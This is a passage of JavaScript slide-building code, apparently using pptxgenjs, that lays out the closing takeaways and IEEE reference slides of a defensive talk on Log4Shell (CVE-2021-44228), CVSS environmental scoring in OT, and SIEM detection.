    s.addShape(pres.ShapeType.roundRect, { x, y, w: 5.85, h: 0.12, rectRadius: 0.05, fill: { color: col[2] }, line: { type: "none" } });
    txt(s, col[0], { x: x + 0.35, y: y + 0.3, w: 5.1, h: 0.5, fontSize: 21, bold: true, color: col[3] });
    txt(s, col[1].map(t => ({ text: t, options: { bullet: { indent: 16 }, breakLine: true } })), { x: x + 0.35, y: y + 1.05, w: 5.15, h: 2.6, fontSize: 15, color: ONDARK, paraSpaceAfter: 10 });
  });
}

// ============================================================ 20 TAKEAWAYS
{
  const s = slide("takeaways");
  eyebrow(s, "In summary"); title(s, "Three things to take away", false, 32);
  const t = [
    ["01", "10.0, but not everywhere equally", "A maximal base score; environmental scoring (9.5→8.0) is how we sequence the fix across OT.", BLUE],
    ["02", "Patching alone was never enough", "A family of CVEs, buried in the supply chain and in OT firmware — detection has to run alongside remediation.", BLUE],
    ["03", "The SIEM turns three weak signals into one", "Right inputs, correlated insights, safety-gated actions — we see an attempt before it becomes a grid incident.", RED],
  ];
  t.forEach((k, i) => {
    const y = 2.15 + i * 1.5;
    card(s, M, y, W - 2 * M, 1.35, { line: LINE });
    txt(s, k[0], { x: M + 0.35, y: y + 0.35, w: 1.2, h: 0.7, fontFace: MONO, fontSize: 34, bold: true, color: k[3] });
    txt(s, k[1], { x: M + 1.8, y: y + 0.22, w: 10.2, h: 0.5, fontSize: 20, bold: true, color: INK });
    txt(s, k[2], { x: M + 1.8, y: y + 0.72, w: 10.3, h: 0.55, fontSize: 14.5, color: BODY });
  });
}

// ============================================================ 21 REFS
{
  const s = slide("refs", NAVY);
  eyebrow(s, "References (IEEE)", true); title(s, "Selected sources", true, 28);
  const left = ["MITRE, “CVE-2021-44228,” CVE.org.", "NIST, NVD “CVE-2021-44228 Detail.”", "Apache SF, “Log4j Security Vulnerabilities.”", "FIRST, “CVSS v3.1 Specification.”", "FIRST, “CVSS v4.0 Specification.”", "Mell, Scarfone, Romanosky, “CVSS v2.0 Guide,” 2007.", "CISA, “Apache Log4j Vulnerability Guidance.”", "CISA, “Emergency Directive 22-02,” 2021."];
  const right = ["Cyber Safety Review Board, “Log4j Event,” 2022.", "ACSC, “2021-007: Log4j advice & mitigations.”", "Siemens ProductCERT, Log4j advisories.", "Wetter & Ringland, Google, 2021.", "Splunk TRT, “Detecting Log4j 2 RCE.”", "Wazuh, “Detecting Log4Shell with Wazuh.”", "MITRE ATT&CK, “T1190.”", "NIST SP 800-61r3, 2025."];
  txt(s, left.map((t, i) => ({ text: (i + 1) + ". " + t, options: { breakLine: true } })), { x: M, y: 2.15, w: 5.9, h: 4.2, fontSize: 13, color: ONDARK, paraSpaceAfter: 7 });
  txt(s, right.map((t, i) => ({ text: (i + 9) + ". " + t, options: { breakLine: true } })), { x: M + 6.15, y: 2.15, w: 5.9, h: 4.2, fontSize: 13, color: ONDARK, paraSpaceAfter: 7 });
  txt(s, "Full IEEE reference list with URLs is provided in the accompanying report.", { x: M, y: 6.6, w: 12, h: 0.4, fontSize: 12, italic: true, color: "6E7A8C" });
}

pres.writeFile({ fileName: OUT }).then(f => console.log("wrote", f));
